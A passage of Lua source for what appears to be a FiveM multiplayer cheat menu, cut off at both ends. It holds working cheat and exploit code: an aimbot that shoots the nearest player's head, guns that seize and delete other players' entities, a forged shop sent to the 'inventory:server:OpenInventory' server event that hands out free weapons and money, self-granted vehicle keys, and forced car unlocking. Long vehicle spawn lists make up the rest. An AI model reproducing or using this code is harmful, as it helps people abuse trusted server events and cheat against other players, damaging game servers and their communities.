                                                if hit == 1 and entity and DoesEntityExist(entity) then
                                                    if IsDisabledControlJustPressed(0, 24) then
                                                        Menu.GravityGunEntity = entity
                                                        NetworkRequestControlOfEntity(entity)
                                                    end
                                                end
                                            end
                                            if Menu.GravityGunEntity and DoesEntityExist(Menu.GravityGunEntity) then
                                                local dest = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 3.0)
                                                SetEntityCoordsNoOffset(Menu.GravityGunEntity, dest.x, dest.y, dest.z, false, false, false)
                                                if IsDisabledControlJustPressed(0, 25) then
                                                    local r = GetGameplayCamRot(2)
                                                    local fv = vector3(-math.sin(math.rad(r.z))*math.cos(math.rad(r.x)), math.cos(math.rad(r.z))*math.cos(math.rad(r.x)), math.sin(math.rad(r.x)))
                                                    ApplyForceToEntity(Menu.GravityGunEntity, 1, fv.x*500, fv.y*500, fv.z*500, 0, 0, 0, 0, true, true, true, false, true)
                                                    Menu.GravityGunEntity = nil
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Aimbot", type = "toggle", value = false, onClick = function(state)
                                Menu.AimbotEnabled = state
                                Menu.RegisterFeature("Aimbot", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.AimbotEnabled do
                                            if IsPedShooting(PlayerPedId()) then
                                                local myC = GetEntityCoords(PlayerPedId())
                                                local best, bestPed = 999.0, nil
                                                for _, pid in ipairs(GetActivePlayers()) do
                                                    local tp = GetPlayerPed(pid)
                                                    if tp ~= PlayerPedId() and DoesEntityExist(tp) and not IsEntityDead(tp) then
                                                        local d = #(myC - GetEntityCoords(tp))
                                                        if d < best then best = d; bestPed = tp end
                                                    end
                                                end
                                                if bestPed then
                                                    local head = GetPedBoneCoords(bestPed, 31086, 0.0, 0.0, 0.0)
                                                    local _, wHash = GetCurrentPedWeapon(PlayerPedId(), true)
                                                    ShootSingleBulletBetweenCoords(myC.x, myC.y, myC.z + 0.5, head.x, head.y, head.z, 200, true, wHash, PlayerPedId(), true, false, 2000.0)
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Delete Gun", type = "toggle", value = false, onClick = function(state)
                                Menu.DeleteGunEnabled = state
                                Menu.RegisterFeature("Delete Gun", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.DeleteGunEnabled do
                                            if IsPedShooting(PlayerPedId()) then
                                                local hit, endC, _, _, entity = GetShapeTestResult(StartShapeTestCapsule(
                                                    GetGameplayCamCoord().x, GetGameplayCamCoord().y, GetGameplayCamCoord().z,
                                                    GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 200.0, 0.0).x,
                                                    GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 200.0, 0.0).y,
                                                    GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 200.0, 0.0).z,
                                                    0.5, 12, PlayerPedId(), 7
                                                ))
                                                if hit == 1 and entity and DoesEntityExist(entity) then
                                                    NetworkRequestControlOfEntity(entity)
                                                    SetEntityAsMissionEntity(entity, true, true)
                                                    DeleteEntity(entity)
                                                    Menu.Toast("Entity deleted", "red")
                                                end
                                            end
                                            Citizen.Wait(100)
                                        end
                                    end)
                                end
                            end},
                            {isSeparator = true, separatorText = "Shop"},
                            {name = "Shadow Market", type = "action", onClick = function()
                                Menu.SafeExec([[
                                    local playerItems = {
                                        { name = "weapon_fal", amount = 9999, price = 0, type = "weapon", metadata = { ammo = 50 } },
                                        { name = "rifle_full", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "handcuffs", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "weapon_combatmg", amount = 9999, price = 0, type = "weapon", metadata = { ammo = 150 } },
                                        { name = "weapon_ak47", amount = 9999, price = 0, type = "weapon", metadata = { ammo = 50 } },
                                        { name = "weapon_rpg", amount = 9999, price = 0, type = "weapon", metadata = { ammo = 2 } },
                                        { name = "weapon_railgun", amount = 9999, price = 0, type = "weapon", metadata = { ammo = 30 } },
                                        { name = "weapon_minigun", amount = 9999, price = 0, type = "weapon", metadata = { ammo = 500 } },
                                        { name = "weapon_heavysniper", amount = 9999, price = 0, type = "weapon", metadata = { ammo = 50 } },
                                        { name = "weapon_uzi", amount = 9999, price = 0, type = "weapon", metadata = { ammo = 100 } },
                                        { name = "heavyarmor", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "armor", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "radio", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "advancedlockpick", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "lockpick", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "drill", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "gatecrack", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "electronickit", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "screwdriverset", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "backpack", amount = 9999, price = 0, type = "item", metadata = { slots = 100, weight = 200000 } },
                                        { name = "pistol_ammo", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "rifle_ammo", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "smg_ammo", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "shotgun_ammo", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "snp_ammo", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "mg_ammo", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "rpg_ammo", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "money", amount = 9999, price = 0, type = "item", metadata = { worth = 100000 } },
                                        { name = "goldbar", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "diamond", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "rolex", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "diamond_ring", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "firstaid", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "bandage", amount = 9999, price = 0, type = "item", metadata = {} },
                                        { name = "painkillers", amount = 9999, price = 0, type = "item", metadata = {} },
                                    }
                                    local fakeShop = { label = "Shadow Infinite Market", slots = #playerItems, items = {} }
                                    for i, v in ipairs(playerItems) do
                                        fakeShop.items[i] = { name = v.name, price = v.price, amount = v.amount, info = v.metadata or {}, type = v.type, slot = i }
                                    end
                                    TriggerServerEvent('inventory:server:OpenInventory', 'shop', 'Vendingshop_' .. math.random(1,99999), fakeShop)
                                ]])
                            end},
                        }
                    },
                }
            },

            {
                name = "VEHICLE",
                hasTabs = true,
                tabs = {
                    {
                        name = "Spawn",
                        items = {
                            {isSeparator = true, separatorText = "Quick Spawn"},
                            {name = "Zentorno (vrp)", type = "action", onClick = function() Menu.SpawnVehicle("zentorno") end},
                            {name = "Insurgent (vrp)", type = "action", onClick = function() Menu.SpawnVehicle("insurgent2") end},
                            {isSeparator = true, separatorText = "Custom"},
                            {name = "Spawn + Key (cfw)", type = "action", onClick = function()
                                Menu.OpenInput("Spawn + Key", "Vehicle name (e.g. bruiser3):", function(input)
                                    if not input or input == "" then return end
                                    local vName = input:lower()
                                    Citizen.CreateThread(function()
                                        local h = GetHashKey(vName)
                                        RequestModel(h)
                                        local t = 0
                                        while not HasModelLoaded(h) and t < 5000 do Citizen.Wait(10) t = t + 10 end
                                        if not HasModelLoaded(h) then return end
                                        local c = GetEntityCoords(PlayerPedId())
                                        local hd = GetEntityHeading(PlayerPedId())
                                        local veh = CreateVehicle(h, c.x, c.y, c.z, hd, true, false)
                                        if DoesEntityExist(veh) then
                                            local plate = GetVehicleNumberPlateText(veh)
                                            TriggerEvent('vehiclekeys:client:SetOwner', plate)
                                            TriggerServerEvent('qb-vehiclekeys:server:addKey', plate, GetPlayerServerId(PlayerId()))
                                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1)
                    
                                        end
                                        SetModelAsNoLongerNeeded(h)
                                    end)
                                end)
                            end},
                            {name = "Spawn by name (vrp)", type = "action", onClick = function()
                                Menu.OpenInput("Spawn Vehicle", "Vehicle name (e.g. adder):", function(input)
                                    if not input or input == "" then return end
                                    Menu.SpawnVehicle(input:lower())
                                end)
                            end},

                            {isSeparator = true, separatorText = "Server Vehicles"},
                            {name = "Load Server Premium Cars", type = "action", onClick = function(state, item)
                                if not GetAllVehicleModels then
                                    Menu.Toast("Not supported on this server/client version.", "red")
                                    return
                                end
                                Menu.Toast("Scanning server vehicles...", "yellow")
                                Citizen.CreateThread(function()
                                    local all = GetAllVehicleModels()
                                    local premium = {}
                                    for _, v in ipairs(all) do
                                        local h = GetHashKey(v)
                                        local c = GetVehicleClassFromName(h)
                                        if c == 6 or c == 7 or c == 8 then -- 6: Sports, 7: Super, 8: Motorcycles
                                            table.insert(premium, string.upper(v))
                                        end
                                    end
                                    if #premium > 0 then
                                        for _, cat in pairs(Menu.Categories) do
                                            if cat.tabs then
                                                for _, tab in ipairs(cat.tabs) do
                                                    if tab.name == "Spawn" then
                                                        for _, it in ipairs(tab.items) do
                                                            if it.name == "load" or it.name == "server premium cars" then
                                                                it.name = "server premium cars"
                                                                it.options = premium
                                                                it.selected = 1
                                                                Menu.Toast("Loaded " .. #premium .. " luxurious cars!", "green")
                                                                return
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    else
                                        Menu.Toast("No premium cars found.", "red")
                                    end
                                end)
                            end},
                            {name = "load", type = "selector", selected = 1, options = {"Click 'Load Server Premium Cars' first"}, onClick = function(sel, val)
                                if val and val ~= "Click 'Load Server Premium Cars' first" then Menu.SpawnVehicle(val:lower()) end
                            end},
                            {name = "Load All Server Vehicles", type = "action", onClick = function(state, item)
                                if not GetAllVehicleModels then
                                    Menu.Toast("Not supported on this server/client version.", "red")
                                    return
                                end
                                Menu.Toast("Scanning all server vehicles...", "yellow")
                                Citizen.CreateThread(function()
                                    local all = GetAllVehicleModels()
                                    local formatted = {}
                                    for _, v in ipairs(all) do
                                        print(v)
                                        table.insert(formatted, string.upper(v))
                                    end
                                    if #formatted > 0 then
                                        for _, cat in pairs(Menu.Categories) do
                                            if cat.tabs then
                                                for _, tab in ipairs(cat.tabs) do
                                                    if tab.name == "Spawn" then
                                                        for _, it in ipairs(tab.items) do
                                                            if it.name == "all vehicles list" or it.name == "select vehicle to spawn" then
                                                                it.name = "select vehicle to spawn"
                                                                it.options = formatted
                                                                it.selected = 1
                                                                Menu.Toast("Loaded " .. #formatted .. " vehicles!", "green")
                                                                return
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    else
                                        Menu.Toast("No vehicles found.", "red")
                                    end
                                end)
                            end},
                            {name = "all vehicles list", type = "selector", selected = 1, options = {"Click 'Load All Server Vehicles' first"}, onClick = function(sel, val)
                                if val and val ~= "Click 'Load All Server Vehicles' first" then Menu.SpawnVehicle(val:lower()) end
                            end},
                            {name = "Unlock Closest", type = "action", onClick = function()
                                local c = GetEntityCoords(PlayerPedId())
                                local v = GetClosestVehicle(c.x,c.y,c.z, 20.0, 0, 71)
                                if DoesEntityExist(v) then SetVehicleDoorsLocked(v, 1) end
                            end},
                            {name = "TP into Closest", type = "action", onClick = function()
                                local c = GetEntityCoords(PlayerPedId())
                                local v = GetClosestVehicle(c.x,c.y,c.z, 30.0, 0, 71)
                                if DoesEntityExist(v) then
                                    SetVehicleDoorsLocked(v, 1)
                                    for s = -1, GetVehicleMaxNumberOfPassengers(v) - 1 do
                                        if IsVehicleSeatFree(v, s) then TaskWarpPedIntoVehicle(PlayerPedId(), v, s) return end
                                    end
                                end
                            end},
                            {name = "Delete Current Vehicle", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    TaskLeaveVehicle(PlayerPedId(), veh, 16)
                                    Citizen.Wait(1500)
                                    DeleteEntity(veh)
                                end
                            end},

                            {isSeparator = true, separatorText = "Spawn Options"},
                            {name = "Teleport Into", type = "toggle", value = false, onClick = function(state) TeleportInto = state Menu.Toast("TP Into: " .. (state and "ON" or "OFF"), "blue") end},
                            {name = "Delete Previous", type = "toggle", value = false, onClick = function(state) DeletePrevious = state Menu.Toast("Del Previous: " .. (state and "ON" or "OFF"), "blue") end},

                            {isSeparator = true, separatorText = "Compacts"},
                            {name = "Compacts", type = "selector", options = {"Blista","Brioso","Dilettante","Issi2","Panto","Prairie","Rhapsody"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Sedans"},
                            {name = "Sedans", type = "selector", options = {"Asea","Asterope","Cognoscenti","Emperor","Fugitive","Glendale","Ingot","Intruder","Premier","Primo","Regina","Schafter2","Stanier","Stratum","Surge","Tailgater","Washington"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "SUVs"},
                            {name = "SUVs", type = "selector", options = {"Baller","Baller2","BjXL","Cavalcade","Contender","Dubsta","FQ2","Granger","Gresley","Habanero","Huntley","Landstalker","Mesa","Patriot","Radi","Rocoto","Seminole","XLS"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Coupes"},
                            {name = "Coupes", type = "selector", options = {"CogCabrio","Exemplar","F620","Felon","Felon2","Jackal","Oracle","Oracle2","Sentinel","Sentinel2","Windsor","Zion","Zion2"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Muscles"},
                            {name = "Muscles", type = "selector", options = {"Blade","Buccaneer","Chino","Coquette3","Dominator","Dukes","Gauntlet","Hotknife","Nightshade","Phoenix","Picador","RatLoader","Ruiner","SabreGT","SlamVan","Stallion","Tampa","Vigero","Virgo","Voodoo"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Sports Classic"},
                            {name = "Sports Classic", type = "selector", options = {"Casco","Coquette2","JB700","Manana","Monroe","Peyote","Pigalle","Stinger","StingerGT","Tornado","Tornado2","ZType"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Sports"},
                            {name = "Sports", type = "selector", options = {"Alpha","Banshee","BestiaGTS","Buffalo","Buffalo2","Carbonizzare","Comet2","Coquette","Elegy2","Feltzer2","Furore","Fusilade","Jester","Jester2","Khamelion","Massacro","Massacro2","Penumbra","RapidGT","RapidGT2","Schafter3","Schwartzer","Sultan","Surano"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Super"},
                            {name = "Super", type = "selector", options = {"Adder","Bullet","Cheetah","EntityXF","FMJ","Infernus","ItaliGTB","Nero","Nero2","Osiris","Penetrator","Reaper","SC1","Sheava","Sultan3","T20","Tempesta","Turismo2","Turismor","Tyrus","Vagner","Visione","Voltic","XA21","Zentorno"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Motorcycles"},
                            {name = "Motorcycles", type = "selector", options = {"Akuma","Avarus","Bagger","Bati","Bati2","BF400","CarbonRS","Chimera","Daemon","Defiler","Double","Enduro","Esskey","Faggio","Faggio2","Gargoyle","Hakuchou","Hakuchou2","Hexer","Innovation","Lectro","Nemesis","Nightblade","Oppressor","PCJ","Ruffian","Sanchez","Shotaro","Thrust","Vindicator","Vindicator","Wolfsbane","Zombiea"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Off-Road"},
                            {name = "Off-Road", type = "selector", options = {"BfInjection","Bifta","Blazer","Blazer2","Blazer3","Bodhi2","Brawler","Dloader","Dubsta3","Insurgent","Insurgent2","Kalahari","Kamacho","Marshall","Mesa3","RancherXL","Rebel","Rebel2","Sandking","Sandking2","Trophy","Trophy2"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Industrial"},
                            {name = "Industrial", type = "selector", options = {"Cutter","Dump","Flatbed","Guardian","Handler","Mixer","Mixer2","Rubble","TipTruck","TipTruck2"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Utility"},
                            {name = "Utility", type = "selector", options = {"Airtug","Caddy","Caddy2","Docktug","Forklift","Mower","Ripley","Sadler","Sadler2","Towtruck","Towtruck2","Tractor","UtilityTruck","UtilityTruck2"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},

                            {isSeparator = true, separatorText = "Vans"},
                            {name = "Vans", type = "selector", options = {"Bison","BobcatXL","Burrito","Burrito2","Camper","GBurrito","Minivan","Paradise","Pony","Pony2","Rumpo","Speedo","Speedo2","Surfer","Surfer2","Taco","Youga"}, selected = 1, onClick = function(sel, v) Menu.SpawnVehicle(v:lower()) end},
                        }
                    },
                    {
                        name = "Mods",
                        items = {
                            {name = "Godmode Vehicle", type = "toggle", value = false, onClick = function(state)
                                local ped = PlayerPedId()
                                if IsPedInAnyVehicle(ped, false) then
                                    local veh = GetVehiclePedIsIn(ped, false)
                                    if state then
                                        Menu.SafeExec(string.format([[
                                            local v = NetToVeh(%d)
                                            if DoesEntityExist(v) then
                                                SetEntityProofs(v, true, true, true, true, true, true, true, true)
                                                SetVehicleStrong(v, true)
                                                SetVehicleTyresCanBurst(v, false)
                                                SetVehicleCanBeVisiblyDamaged(v, false)
                                                SetVehicleEngineHealth(v, 1000.0)
                                                SetVehicleBodyHealth(v, 1000.0)
                                                SetVehiclePetrolTankHealth(v, 1000.0)
                                                SetDisableVehiclePetrolTankDamage(v, true)
                                                SetDisableVehiclePetrolTankFires(v, true)
                                                SetVehicleWheelsCanBreak(v, false)
                                            end
                                        ]], VehToNet(veh)))
                                    else
                                        Menu.SafeExec(string.format([[
                                            local v = NetToVeh(%d)
                                            if DoesEntityExist(v) then
                                                SetEntityProofs(v, false, false, false, false, false, false, false, false)
                                                SetVehicleStrong(v, false)
                                                SetVehicleTyresCanBurst(v, true)
                                                SetVehicleCanBeVisiblyDamaged(v, true)
                                                SetDisableVehiclePetrolTankDamage(v, false)
                                                SetDisableVehiclePetrolTankFires(v, false)
                                            end
                                        ]], VehToNet(veh)))
                                    end
                                end
                            end},
                            {name = "Repair Vehicle", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    Menu.SafeExec(string.format([[
                                        local v = NetToVeh(%d)
                                        if DoesEntityExist(v) then
                                            SetVehicleFixed(v)
                                            SetVehicleDeformationFixed(v)
                                            SetVehicleDirtLevel(v, 0.0)
                                            SetVehicleEngineHealth(v, 1000.0)
                                            SetVehicleBodyHealth(v, 1000.0)
                                            SetVehiclePetrolTankHealth(v, 1000.0)
                                        end
                                    ]], VehToNet(veh)))
                                end
                            end},
                            {name = "Flip Vehicle", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), false))
                                end
                            end},
                            {name = "Max Upgrade", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    SetVehicleModKit(veh, 0)
                                    for i = 0, 50 do
                                        local max = GetNumVehicleMods(veh, i)
                                        if max > 0 then SetVehicleMod(veh, i, max - 1, false) end
                                    end
                                    ToggleVehicleMod(veh, 18, true)
                                    ToggleVehicleMod(veh, 22, true)
                                    SetVehicleWindowTint(veh, 1)
                                end
                            end},
                            {isSeparator = true, separatorText = "Other"},
                            {name = "Speed Boost", type = "toggle", value = false, onClick = function(state)
                                Menu.SpeedBoostEnabled = state
                            end},
                            {name = "Drift Mode", type = "toggle", value = false, onClick = function(state)
                                Menu.DriftModeEnabled = state
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    if state then
                                        SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 0.0)
                                        SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 0.0)
                                        SetVehicleHandlingFloat(veh, "CHandlingData", "fLowSpeedTractionLossMult", 5.0)
                                    else
                                        local default = GetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax")
                                        SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 2.0)
                                        SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 2.5)
                                        SetVehicleHandlingFloat(veh, "CHandlingData", "fLowSpeedTractionLossMult", 0.0)
                                    end
                                end
                            end},
                            {name = "Horn Boost", type = "toggle", value = false, onClick = function(state)
                                Menu.HornBoostEnabled = state
                            end},
                            {name = "Engine Always On", type = "toggle", value = false, onClick = function(state)
                                Menu.EngineAlwaysOn = state
                            end},

                            {isSeparator = true, separatorText = "Fun"},

                            {name = "Vehicle Fly", type = "toggle", value = false, onClick = function(state)
                                Menu.VehicleFlyEnabled = state
                                Menu.RegisterFeature("Vehicle Fly", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.VehicleFlyEnabled do
                                            if IsPedInAnyVehicle(PlayerPedId(), false) then
                                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                                SetEntityHasGravity(veh, false)
                                                local speed = 1.5
                                                if IsControlPressed(0, 21) then speed = 4.0 end
                                                if IsControlPressed(0, 44) then
                                                    ApplyForceToEntity(veh, 1, 0.0, 0.0, speed, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                end
                                                if IsControlPressed(0, 20) then
                                                    ApplyForceToEntity(veh, 1, 0.0, 0.0, -speed, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                end
                                                if IsControlPressed(0, 32) then
                                                    ApplyForceToEntity(veh, 1, 0.0, speed * 2, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                        if IsPedInAnyVehicle(PlayerPedId(), false) then
                                            SetEntityHasGravity(GetVehiclePedIsIn(PlayerPedId(), false), true)
                                        end
                                    end)
                                end
                            end},

                            {name = "Rainbow Car", type = "toggle", value = false, onClick = function(state)
                                Menu.RainbowCarEnabled = state
                                Menu.RegisterFeature("Rainbow Car", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        local hue = 0
                                        while Menu.RainbowCarEnabled do
                                            if IsPedInAnyVehicle(PlayerPedId(), false) then
                                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                                local h = hue / 360
                                                local r, g, b
                                                local i = math.floor(h * 6)
                                                local f = h * 6 - i
                                                if i % 6 == 0 then r, g, b = 1, f, 0
                                                elseif i % 6 == 1 then r, g, b = 1 - f, 1, 0
                                                elseif i % 6 == 2 then r, g, b = 0, 1, f
                                                elseif i % 6 == 3 then r, g, b = 0, 1 - f, 1
                                                elseif i % 6 == 4 then r, g, b = f, 0, 1
                                                else r, g, b = 1, 0, 1 - f end
                                                SetVehicleCustomPrimaryColour(veh, math.floor(r*255), math.floor(g*255), math.floor(b*255))
                                                SetVehicleCustomSecondaryColour(veh, math.floor(r*255), math.floor(g*255), math.floor(b*255))
                                                hue = (hue + 5) % 360
                                            end
                                            Citizen.Wait(50)
                                        end
                                    end)
                                end
                            end},

                            {name = "Seatbelt", type = "toggle", value = false, onClick = function(state)
                                Menu.SeatbeltEnabled = state
                                Menu.RegisterFeature("Seatbelt", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.SeatbeltEnabled do
                                            SetPedCanBeKnockedOffVehicle(PlayerPedId(), 1)
                                            SetPedConfigFlag(PlayerPedId(), 32, false)
                                            DisableControlAction(0, 75, true)
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Invisible Vehicle", type = "toggle", value = false, onClick = function(state)
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    if state then
                                        SetEntityVisible(veh, false, false)
                                        SetEntityAlpha(veh, 0, false)
                                    else
                                        SetEntityVisible(veh, true, false)
                                        ResetEntityAlpha(veh)
                                    end
                                end
                                Menu.RegisterFeature("Invisible Vehicle", state)
                            end},

                            {name = "Vehicle Weapons", type = "toggle", value = false, onClick = function(state)
                                Menu.VehicleWeaponsEnabled = state
                                Menu.RegisterFeature("Vehicle Weapons", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.VehicleWeaponsEnabled do
                                            if IsPedInAnyVehicle(PlayerPedId(), false) then
                                                if IsControlJustPressed(0, 69) then -- INPUT_VEH_ATTACK
                                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    local c = GetEntityCoords(veh)
                                                    local fv = GetEntityForwardVector(veh)
                                                    local dest = vector3(c.x + fv.x * 200, c.y + fv.y * 200, c.z + fv.z * 200)
                                                    local hash = GetHashKey("WEAPON_VEHICLE_ROCKET")
                                                    ShootSingleBulletBetweenCoords(c.x + fv.x * 5, c.y + fv.y * 5, c.z, dest.x, dest.y, dest.z, 200, true, hash, PlayerPedId(), true, false, 500.0)
                                                    AddOwnedExplosion(PlayerPedId(), dest.x, dest.y, dest.z, 5, 100.0, true, false, 1.0)
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Slam Vehicle", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    ApplyForceToEntity(veh, 1, 0.0, 0.0, -50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                    Menu.Toast("SLAMMED!", "red")
                                end
                            end},

                            {name = "Wheelie", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    ApplyForceToEntity(veh, 1, 0.0, 0.0, 15.0, 0.0, -3.0, 0.0, 0, true, true, true, false, true)
                                end
                            end},

                            {name = "Flip to Air", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    ApplyForceToEntity(veh, 1, 0.0, 0.0, 80.0, 10.0, 0.0, 0.0, 0, true, true, true, false, true)
                                    Menu.Toast("FLIP!", "blue")
                                end
                            end},
                            {isSeparator = true, separatorText = "Doors"},
                            {name = "Lock Doors", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    SetVehicleDoorsLocked(GetVehiclePedIsIn(PlayerPedId(), false), 2)
                                end
                            end},
                            {name = "Unlock Doors", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    SetVehicleDoorsLocked(GetVehiclePedIsIn(PlayerPedId(), false), 1)
                                end
                            end},
                            {name = "Open All Doors", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    for i = 0, 5 do SetVehicleDoorOpen(veh, i, false, false) end
                                end
                            end},
                            {isSeparator = true, separatorText = "Plate"},
                            {name = "Change Plate", type = "action", onClick = function()
                                Menu.OpenInput("License Plate", "Enter plate text:", function(input)
                                    if not input or input == "" then return end
                                    if IsPedInAnyVehicle(PlayerPedId(), false) then
                                        SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), false), input:sub(1, 8))
                                    end
                                end)
                            end},
                            {name = "Delete Vehicle", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    TaskLeaveVehicle(PlayerPedId(), veh, 16)
                                    Citizen.Wait(1500)
                                    DeleteEntity(veh)
                                end
                            end},

                            {isSeparator = true, separatorText = "Extra Toggles"},

                            {name = "Instant Brakes", type = "toggle", value = false, onClick = function(state)
                                Menu.InstantBrakes = state
                                Menu.RegisterFeature("Instant Brakes", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.InstantBrakes do
                                            if IsPedInAnyVehicle(PlayerPedId(), false) then
                                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                                if IsControlPressed(0, 72) then
                                                    SetVehicleForwardSpeed(veh, 0.0)
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Easy Handling", type = "toggle", value = false, onClick = function(state)
                                Menu.EasyHandling = state
                                Menu.RegisterFeature("Easy Handling", state)
                                if state and IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 5.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionBiasFront", 0.5)
                                end
                            end},

                            {name = "Unlimited Fuel", type = "toggle", value = false, onClick = function(state)
                                Menu.UnlimitedFuel = state
                                Menu.RegisterFeature("Unlimited Fuel", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.UnlimitedFuel do
                                            if IsPedInAnyVehicle(PlayerPedId(), false) then
                                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                                SetVehicleFuelLevel(veh, 100.0)
                                                DecorSetFloat(veh, "_FUEL_LEVEL", 100.0)
                                            end
                                            Citizen.Wait(1000)
                                        end
